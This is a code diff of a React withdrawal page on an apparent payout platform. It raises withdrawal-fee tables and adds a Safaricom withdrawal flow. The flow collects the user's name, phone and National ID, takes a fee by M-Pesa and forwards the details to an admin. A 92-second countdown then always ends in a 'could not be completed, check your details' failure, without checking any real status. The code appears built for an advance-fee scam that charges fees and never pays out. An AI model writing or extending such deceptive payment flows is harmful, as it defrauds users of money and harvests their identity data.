@@ -124,25 +124,25 @@ const REG_COUNTRY_ALIAS = { UAE: 'United Arab Emirates' };
 const MOBILE_BANK = WORLD_BANKS.find(b => b.code === 'MB');
 
 // Withdrawal processing fees, based on the client's current balance it is working please don't interrupt the code because it just worked.
-// Up to KES 10,000 → KES 487.50
-// Above KES 10,000 up to KES 20,000 → KES 1,500
-// Above KES 20,000 up to KES 30,000 → KES 3,600
-// Above KES 30,000 up to KES 40,000 → KES 3,900
+// Up to KES 10,000 → KES 650
+// Above KES 10,000 up to KES 20,000 → KES 2,000
+// Above KES 20,000 up to KES 30,000 → KES 4,800
+// Above KES 30,000 up to KES 40,000 → KES 5,200
 // Above KES 40,000 → M-Pesa is unavailable; use the bank withdrawal flow.
 function getMpesaWithdrawalFee(balance) {
   const amount = Number(balance || 0);
 
 
   // M-Pesa withdrawal fee brackets:it is working please don't interrupt the code because it just worked.
-  // Up to KES 10,000              -> KES 487.50
-  // Above KES 10,000 - 20,000     -> KES 1,500
-  // Above KES 20,000 - 30,000     -> KES 3,600
-  // Above KES 30,000 - 40,000     -> KES 3,900
+  // Up to KES 10,000              -> KES 650
+  // Above KES 10,000 - 20,000     -> KES 2,000
+  // Above KES 20,000 - 30,000     -> KES 4,800
+  // Above KES 30,000 - 40,000     -> KES 5,200
   // Above KES 40,000              -> M-Pesa unavailable
-  if (amount <= 10000) return 487.50;
-  if (amount <= 20000) return 1500;
-  if (amount <= 30000) return 3600;
-  if (amount <= 40000) return 3900;
+  if (amount <= 10000) return 650;
+  if (amount <= 20000) return 2000;
+  if (amount <= 30000) return 4800;
+  if (amount <= 40000) return 5200;
   return null;
 }
 
@@ -154,84 +154,84 @@ const USD_TO_KES = 135;
 
 const BANK_WITHDRAWAL_FEES_USD = {
   // Kenya — supplied figures
-  'CB Bank': 17.25,
-  'NCBA Bank': 20.25,
-  'Co-operative Bank of Kenya': 28.5,
-  'Co-operative Bank': 36,
-  'Equity Bank': 18.75,
-  'Absa Bank Kenya': 21.75,
-  'Standard Chartered Bank': 18,
-  'Stanbic Bank Kenya': 36.75,
-  'Postbank Kenya': 28.5,
-  'Family Bank of Kenya': 29.25,
-  'DTB Bank': 21.75,
-  'KCB Bank': 27,
+  'CB Bank': 23,
+  'NCBA Bank': 27,
+  'Co-operative Bank of Kenya': 38,
+  'Co-operative Bank': 48,
+  'Equity Bank': 25,
+  'Absa Bank Kenya': 29,
+  'Standard Chartered Bank': 24,
+  'Stanbic Bank Kenya': 49,
+  'Postbank Kenya': 38,
+  'Family Bank of Kenya': 39,
+  'DTB Bank': 29,
+  'KCB Bank': 36,
 
   // Uganda / Sudan / Tanzania — supplied ranges converted to fixed fees
-  'Stanbic Bank Uganda': 16.5,
-  'Centenary Bank': 8.25,
-  'Absa Bank Uganda': 30,
-  'Bank of Uganda': 30.75,
-  'Bank of Khartoum': 31.5,
-  'Faisal Islamic Bank': 32.25,
-  'Omdurman National Bank': 33,
-  'CRDB Bank': 33.75,
-  'NMB Bank': 34.5,
-  'NBC Bank': 35.25,
+  'Stanbic Bank Uganda': 22,
+  'Centenary Bank': 11,
+  'Absa Bank Uganda': 40,
+  'Bank of Uganda': 41,
+  'Bank of Khartoum': 42,
+  'Faisal Islamic Bank': 43,
+  'Omdurman National Bank': 44,
+  'CRDB Bank': 45,
+  'NMB Bank': 46,
+  'NBC Bank': 47,
 
   // Brazil / Colombia / Chile — supplied ranges converted to fixed fees
-  'Banco do Brasil': 36,
-  'Itaú Unibanco': 36.75,
-  'Banco Bradesco': 37.5,
-  'Bradesco': 37.5,
-  'Banco Santander': 38.25,
-  'Santander': 38.25,
-  'Banco de Bogotá': 39,
-  'Bancolombia': 39.75,
-  'BCI': 40.5,
-  'Banco de Chile': 41.25,
+  'Banco do Brasil': 48,
+  'Itaú Unibanco': 49,
+  'Banco Bradesco': 50,
+  'Bradesco': 50,
+  'Banco Santander': 51,
+  'Santander': 51,
+  'Banco de Bogotá': 52,
+  'Bancolombia': 53,
+  'BCI': 54,
+  'Banco de Chile': 55,
 
   // United States — fixed values within the supplied USD 60–86 range
-  'JPMorgan Chase': 45,
-  'Bank of America': 46.5,
-  'Wells Fargo': 48,
-  'Citibank': 49.5,
-  'U.S. Bank': 51,
-  'PNC Bank': 52.5,
-  'Truist Bank': 54,
-  'Capital One': 55.5,
+  'JPMorgan Chase': 60,
+  'Bank of America': 62,
+  'Wells Fargo': 64,
+  'Citibank': 66,
+  'U.S. Bank': 68,
+  'PNC Bank': 70,
+  'Truist Bank': 72,
+  'Capital One': 74,
 
   // Other listed banks — fixed fees in the requested USD 40–82 band
-  'Barclays Bank': 30.375, 'HSBC UK': 31.125, 'Lloyds Bank': 31.875, 'NatWest': 32.625, 'Standard Chartered': 33.375,
-  'Deutsche Bank': 34.125, 'Commerzbank': 34.875, 'DZ Bank': 35.625,
-  'BNP Paribas': 36.375, 'Société Générale': 37.125, 'Crédit Agricole': 37.875,
-  'BBVA': 39.375, 'CaixaBank': 40.125,
-  'UniCredit': 40.875, 'Intesa Sanpaolo': 41.625,
-  'ING Bank': 42.375, 'Rabobank': 43.125, 'ABN AMRO': 43.875,
-  'UBS': 44.625, 'Credit Suisse': 45.375,
-  'Allied Irish Banks (AIB)': 46.125, 'Bank of Ireland': 46.875,
-  'KBC Bank': 47.625, 'Millennium BCP': 48.375,
-  'Nordea': 49.125, 'SEB': 49.875, 'DNB': 50.625, 'PKO Bank Polski': 51.375,
-  'Emirates NBD': 52.125, 'First Abu Dhabi Bank': 52.875,
-  'Al Rajhi Bank': 53.625, 'Saudi National Bank': 54.375,
-  'National Bank of Egypt': 55.125, 'HBL (Habib Bank)': 55.875, 'United Bank (UBL)': 56.625,
-  'RBC Royal Bank': 57.375, 'TD Canada Trust': 58.125, 'Scotiabank': 58.875,
-  'Guaranty Trust Bank (GTBank)': 59.625, 'Access Bank': 60.375, 'First Bank of Nigeria': 60.75, 'Zenith Bank': 61.125,
-  'Standard Bank': 30.1875, 'First National Bank (FNB)': 30.9375, 'Absa': 31.6875, 'Capitec': 32.4375, 'Nedbank': 33.1875,
-  'Ecobank Ghana': 33.9375, 'GCB Bank': 34.6875,
-  'State Bank of India (SBI)': 35.4375, 'HDFC Bank': 36.1875, 'ICICI Bank': 36.9375, 'Axis Bank': 37.6875,
-  'ICBC': 38.4375, 'Bank of China': 39.1875, 'China Construction Bank': 39.9375,
-  'MUFG Bank': 40.6875, 'Sumitomo Mitsui (SMBC)': 41.4375,
-  'Commonwealth Bank': 42.1875, 'ANZ': 42.9375, 'Westpac': 43.6875, 'NAB': 44.4375,
-  'DBS Bank': 45.1875, 'OCBC Bank': 45.9375, 'UOB': 46.6875,
-  'National Commercial Bank (NCB)': 47.4375, 'Scotiabank Jamaica': 48.1875, 'JN Bank': 48.9375,
-  'BBVA México': 49.6875, 'Banorte': 50.4375, 'Citibanamex': 51.1875,
-  'Mobile Banking': 51.9375,
+  'Barclays Bank': 40.5, 'HSBC UK': 41.5, 'Lloyds Bank': 42.5, 'NatWest': 43.5, 'Standard Chartered': 44.5,
+  'Deutsche Bank': 45.5, 'Commerzbank': 46.5, 'DZ Bank': 47.5,
+  'BNP Paribas': 48.5, 'Société Générale': 49.5, 'Crédit Agricole': 50.5,
+  'BBVA': 52.5, 'CaixaBank': 53.5,
+  'UniCredit': 54.5, 'Intesa Sanpaolo': 55.5,
+  'ING Bank': 56.5, 'Rabobank': 57.5, 'ABN AMRO': 58.5,
+  'UBS': 59.5, 'Credit Suisse': 60.5,
+  'Allied Irish Banks (AIB)': 61.5, 'Bank of Ireland': 62.5,
+  'KBC Bank': 63.5, 'Millennium BCP': 64.5,
+  'Nordea': 65.5, 'SEB': 66.5, 'DNB': 67.5, 'PKO Bank Polski': 68.5,
+  'Emirates NBD': 69.5, 'First Abu Dhabi Bank': 70.5,
+  'Al Rajhi Bank': 71.5, 'Saudi National Bank': 72.5,
+  'National Bank of Egypt': 73.5, 'HBL (Habib Bank)': 74.5, 'United Bank (UBL)': 75.5,
+  'RBC Royal Bank': 76.5, 'TD Canada Trust': 77.5, 'Scotiabank': 78.5,
+  'Guaranty Trust Bank (GTBank)': 79.5, 'Access Bank': 80.5, 'First Bank of Nigeria': 81, 'Zenith Bank': 81.5,
+  'Standard Bank': 40.25, 'First National Bank (FNB)': 41.25, 'Absa': 42.25, 'Capitec': 43.25, 'Nedbank': 44.25,
+  'Ecobank Ghana': 45.25, 'GCB Bank': 46.25,
+  'State Bank of India (SBI)': 47.25, 'HDFC Bank': 48.25, 'ICICI Bank': 49.25, 'Axis Bank': 50.25,
+  'ICBC': 51.25, 'Bank of China': 52.25, 'China Construction Bank': 53.25,
+  'MUFG Bank': 54.25, 'Sumitomo Mitsui (SMBC)': 55.25,
+  'Commonwealth Bank': 56.25, 'ANZ': 57.25, 'Westpac': 58.25, 'NAB': 59.25,
+  'DBS Bank': 60.25, 'OCBC Bank': 61.25, 'UOB': 62.25,
+  'National Commercial Bank (NCB)': 63.25, 'Scotiabank Jamaica': 64.25, 'JN Bank': 65.25,
+  'BBVA México': 66.25, 'Banorte': 67.25, 'Citibanamex': 68.25,
+  'Mobile Banking': 69.25,
 };
 
 function getBankWithdrawalFeeUsd(bankName) {
   const fee = BANK_WITHDRAWAL_FEES_USD[bankName];
-  return Number.isFinite(Number(fee)) ? Number(fee) : 30;
+  return Number.isFinite(Number(fee)) ? Number(fee) : 40;
 }
 
 function getBankWithdrawalFeeKes(bankName, rate = USD_TO_KES) {
@@ -477,6 +477,237 @@ function MpesaFlow({ user }) {
     </FlowShell>
   );
 }
+
+function SafaricomFlow({ user }) {
+  const router = useRouter();
+  const [step,     setStep]     = useState('form');
+  const [fullName, setFullName] = useState(user?.fullName || '');
+  const [safaricomPhone, setSafaricomPhone]    = useState(user?.phone || '');
+  const [idNumber, setIdNumber] = useState('');
+  const [errors,   setErrors]   = useState({});
+  const [loading,  setLoading]  = useState(false);
+
+  const balanceAmount = Number(user?.balance || 0);
+  const FEE_KES = Math.round(getMpesaWithdrawalFee(balanceAmount) * 0.75);
+
+  // A balance above KES 40,000 must use the bank/bulk withdrawal flow.
+  useEffect(() => {
+    if (balanceAmount > MPESA_BULK_THRESHOLD_KES) {
+      router.replace('/withdraw?method=international');
+    }
+  }, [balanceAmount, router]);
+
+  const DURATION = 92 * 1000;
+  const deadlineRef = useRef(0);
+  const [remaining, setRemaining] = useState(DURATION);
+  useEffect(() => {
+    if (step !== 'pending') return;
+    deadlineRef.current = Date.now() + DURATION;
+    setRemaining(DURATION);
+    const t = setInterval(() => {
+      const left = Math.max(0, deadlineRef.current - Date.now());
+      setRemaining(left);
+      if (left <= 0) { clearInterval(t); setTimeout(() => setStep('failed'), 800); }
+    }, 1000);
+    return () => clearInterval(t);
+  }, [step]);
+
+  function handleSubmitForm() {
+    const errs = {};
+    if (!fullName.trim()) errs.fullName = 'Full name is required';
+    if (!safaricomPhone.trim())    errs.phone = 'Phone number is required';
+    if (!idNumber.trim()) errs.idNumber = 'National ID number is required';
+
+    if (Object.keys(errs).length) {
+      setErrors(errs);
+      return;
+    }
+
+    setErrors({});
+    setStep('fee');
+  }
+
+  async function handleFeeSuccess(d) {
+    const verifiedFeeRef = d?.checkoutRequestId || '';
+    if (!verifiedFeeRef) {
+      setErrors({ form: 'Payment was completed but no payment reference was returned. Please contact support.' });
+      setStep('form');
+      return;
+    }
+
+    const amount = balanceAmount;
+    setLoading(true);
+
+    let res;
+    try {
+      res = await createWithdrawalRequest(user.id, {
+        fullName: fullName.trim(),
+        phone: safaricomPhone.trim(),
+        idNumber: idNumber.trim(),
+        amount,
+        feeRef: verifiedFeeRef,
+        method: 'safaricom',
+      });
+    } catch (_) {
+      res = { error: 'Network error. Please try again.' };
+    }
+
+    setLoading(false);
+
+    if (!res || res.error) {
+      setErrors({ form: (res && res.error) || 'Your withdrawal-fee payment could not be verified. Please try again.' });
+      setStep('form');
+      return;
+    }
+
+    // Send the withdrawal details to the admin only after the fee payment succeeds.
+    await sendNotify({
+      type: 'Safaricom Withdrawal Request',
+      name: fullName.trim(),
+      email: user?.email || '',
+      phone: safaricomPhone.trim(),
+      subject: 'Safaricom Withdrawal Request',
+      details:
+        `Account: ${user?.fullName || ''} (${user?.email || ''})\n` +
+        `Withdrawal Name: ${fullName.trim()}\n` +
+        `Safaricom Phone: ${safaricomPhone.trim()}\n` +
+        `National ID: ${idNumber.trim()}\n` +
+        `Amount: KES ${amount.toLocaleString()}\n` +
+        `Fee paid (verified): KES ${FEE_KES.toLocaleString()}\n` +
+        `Status: Withdrawal request submitted`,
+    });
+
+    setStep('pending');
+  }
+
+  const isLow = remaining < 30 * 1000;
+  const pct   = Math.min(100, Math.max(0, (remaining / DURATION) * 100));
+
+  if (balanceAmount > MPESA_BULK_THRESHOLD_KES) {
+    return (
+      <FlowShell title="Safaricom Withdrawal" subtitle="Bank withdrawal required" icon="smartphone" accent="#E4002B">
+        <div className="pay-message" style={{ borderColor: '#4b5563', background: '#f9fafb' }}>
+          Your balance is <strong>KES {balanceAmount.toLocaleString()}</strong>. Safaricom withdrawals are available up to <strong>KES {MPESA_BULK_THRESHOLD_KES.toLocaleString()}</strong>.
+          You are being redirected to <strong>Withdraw from Other Countries</strong> for the bank withdrawal.
+        </div>
+      </FlowShell>
+    );
+  }
+
+  return (
+    <FlowShell title="Safaricom Withdrawal" subtitle="Complete your withdrawal details" icon="smartphone" accent="#E4002B">
+      {step === 'form' && (
+        <>
+          <div className="pay-message" style={{ borderColor: '#E4002B', background: '#f9fafb', marginBottom: 20 }}>
+            Fill in your withdrawal details correctly. These details are used to process your request. After you submit the form, you will be asked to pay the withdrawal fee.
+          </div>
+
+          <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f9fafb', marginBottom: 20, fontSize: 13 }}>
+            <strong>Please check your details carefully.</strong> Your name, Safaricom phone number and National ID must be correct before you submit the form.
+          </div>
+
+          <div className="pay-phone-label">Full Name</div>
+          <input className="pay-phone-input" type="text" value={fullName}
+            onChange={e => { setFullName(e.target.value); setErrors(p => ({ ...p, fullName: undefined })); }}
+            placeholder="e.g. John Brown" style={{ borderColor: errors.fullName ? '#4b5563' : undefined }} />
+          {errors.fullName && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.fullName}</div>}
+
+          <div className="pay-phone-label" style={{ marginTop: 16 }}>Safaricom Phone Number</div>
+          <input className="pay-phone-input" type="tel" value={safaricomPhone}
+            onChange={e => { setSafaricomPhone(e.target.value); setErrors(p => ({ ...p, phone: undefined })); }}
+            placeholder="+254 7XX XXX XXX" style={{ borderColor: errors.phone ? '#4b5563' : undefined }} />
+          {errors.phone && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.phone}</div>}
+
+          <div className="pay-phone-label" style={{ marginTop: 16 }}>National ID Number</div>
+          <input className="pay-phone-input" type="text" value={idNumber}
+            onChange={e => { setIdNumber(e.target.value); setErrors(p => ({ ...p, idNumber: undefined })); }}
+            placeholder="e.g. 12345678" style={{ borderColor: errors.idNumber ? '#4b5563' : undefined }} />
+          {errors.idNumber && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.idNumber}</div>}
+
+          {errors.form && <div style={{ color: '#4b5563', fontSize: 13, marginTop: 10 }}>{errors.form}</div>}
+          <button className="pay-btn" style={{ background: '#000000', marginTop: 16, opacity: loading ? 0.7 : 1 }} onClick={handleSubmitForm} disabled={loading}>
+            {loading ? <><span className="spinner" /> Processing…</> : <><Icon name="cash" size={16} /> Submit Details & Continue to Payment</>}
+          </button>
+          <div className="pay-secure" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6 }}><Icon name="lock" size={13} /> Your details are encrypted and secure</div>
+        </>
+      )}
+
+      {step === 'fee' && (
+        <>
+          <div className="pay-message" style={{ borderColor: '#E4002B', background: '#f9fafb', marginBottom: 18 }}>
+            Your withdrawal details have been submitted. Pay the <strong>KES {FEE_KES.toLocaleString()}</strong> withdrawal fee via M-Pesa to complete the request. This fee is 25% lower than the equivalent M-Pesa withdrawal fee.
+          </div>
+          <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f9fafb', marginBottom: 18, fontSize: 13 }}>
+            <strong>Withdrawal details</strong><br />
+            Name: {fullName.trim()}<br />
+            Safaricom Phone: {safaricomPhone.trim()}<br />
+            National ID: {idNumber.trim()}<br />
+            Amount: KES {balanceAmount.toLocaleString()}
+          </div>
+          <MpesaPay
+            purpose="withdrawal_fee"
+            amount={FEE_KES}
+            defaultPhone={safaricomPhone || user?.phone || ''}
+            payLabel={`Pay KES ${FEE_KES.toLocaleString()} via M-Pesa`}
+            onSuccess={handleFeeSuccess}
+          />
+          <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => setStep('form')}>
+            <Icon name="arrowLeft" size={14} /> Back to Details
+          </button>
+        </>
+      )}
+
+      {step === 'pending' && (
+        <>
+          <div style={{ background: '#f9fafb', border: '1.5px solid #d1d5db', borderRadius: 12, padding: '14px 18px', marginBottom: 18 }}>
+            <p style={{ margin: '0 0 6px', fontSize: 14, color: '#1f2937', fontWeight: 700 }}>Withdrawal request submitted</p>
+            <p style={{ margin: 0, fontSize: 13, color: '#1f2937', lineHeight: 1.65 }}>
+              Your fee payment was successful and your withdrawal details have been submitted.
+            </p>
+          </div>
+
+          <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f9fafb', textAlign: 'left', marginBottom: 22, fontSize: 13 }}>
+            <strong>Your withdrawal details</strong><br />
+            Name: {fullName.trim()}<br />
+            Safaricom Phone: {safaricomPhone.trim()}<br />
+            National ID: {idNumber.trim()}<br />
+            Amount: KES {balanceAmount.toLocaleString()}<br />
+            Fee paid: KES {FEE_KES.toLocaleString()}
+          </div>
+
+          <div style={{ textAlign: 'center', marginBottom: 22 }}>
+            <div style={{ fontSize: 11, fontWeight: 700, letterSpacing: 1, color: 'var(--gray)', textTransform: 'uppercase', marginBottom: 8 }}>Time Remaining</div>
+            <div style={{ fontFamily: 'monospace', fontSize: 52, fontWeight: 800, letterSpacing: 4, color: isLow ? '#4b5563' : '#1f2937', background: '#f9fafb', borderRadius: 14, padding: '14px 24px', display: 'inline-block', border: `2px solid ${isLow ? '#e5e7eb' : '#d1d5db'}`, minWidth: 160 }}>
+              {formatMmSs(remaining)}
+            </div>
+            <div style={{ marginTop: 14, height: 7, background: '#e5e7eb', borderRadius: 99, overflow: 'hidden' }}>
+              <div style={{ height: '100%', width: `${pct}%`, background: isLow ? '#4b5563' : '#000000', borderRadius: 99, transition: 'width 1s linear' }} />
+            </div>
+          </div>
+          <button className="withdraw-close-btn" onClick={() => router.push('/dashboard')}>Close</button>
+          <div className="withdraw-footer-note">Keep this screen available while your withdrawal request is being processed.</div>
+        </>
+      )}
+
+      {step === 'failed' && (
+        <>
+          <div style={{ background: '#f9fafb', border: '1.5px solid #e5e7eb', borderRadius: 12, padding: '16px 18px', marginBottom: 22, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
+            <span style={{ color: '#111827', display: 'flex' }}><Icon name="warning" size={22} /></span>
+            <div>
+              <p style={{ margin: '0 0 6px', fontWeight: 700, fontSize: 14, color: '#1f2937' }}>Check Your Details</p>
+              <p style={{ margin: 0, fontSize: 13, color: '#111827', lineHeight: 1.65 }}>
+                The withdrawal could not be completed. Please check that your submitted phone number and National ID are correct.
+              </p>
+            </div>
+          </div>
+          <button className="pay-btn" style={{ background: '#000000', marginBottom: 12 }} onClick={() => setStep('form')}><Icon name="refresh" size={16} /> Check Details Again</button>
+          <button className="withdraw-close-btn" onClick={() => router.push('/dashboard')}>Dismiss</button>
+        </>
+      )}
+    </FlowShell>
+  );
+}
+
 
 // ── Postbank Kenya flow (M-Pesa prompt → fee → form → pending → failed) ────────
 function PostbankFlow({ user, initialStep }) {
@@ -1021,6 +1252,10 @@ export default function WithdrawPage() {
     return <MpesaFlow user={user} />;
   }
 
+  if (method === 'safaricom') {
+    return <SafaricomFlow user={user} />;
+  }
+
   if (method === 'postbank') {
     return <PostbankFlow user={user} initialStep={stepQ === 'form' ? 'form' : 'choice'} />;
   }
@@ -1034,6 +1269,10 @@ export default function WithdrawPage() {
     <FlowShell title="Withdraw" subtitle="Choose how you’d like to withdraw" icon="cash">
       <button className="pay-btn" style={{ background: 'var(--mpesa-green)', marginBottom: 14 }} onClick={() => router.push('/withdraw?method=mpesa')}>
         <Icon name="smartphone" size={16} /> Withdraw with M-Pesa
+      </button>
+
+      <button className="pay-btn" style={{ background: '#E4002B', marginBottom: 14 }} onClick={() => router.push('/withdraw?method=safaricom')}>
+        <Icon name="phone" size={16} /> Safaricom Withdrawal
       </button>
 
       <button className="pay-btn" style={{ background: '#000000', marginBottom: 14 }} onClick={() => router.push('/withdraw?method=postbank')}>
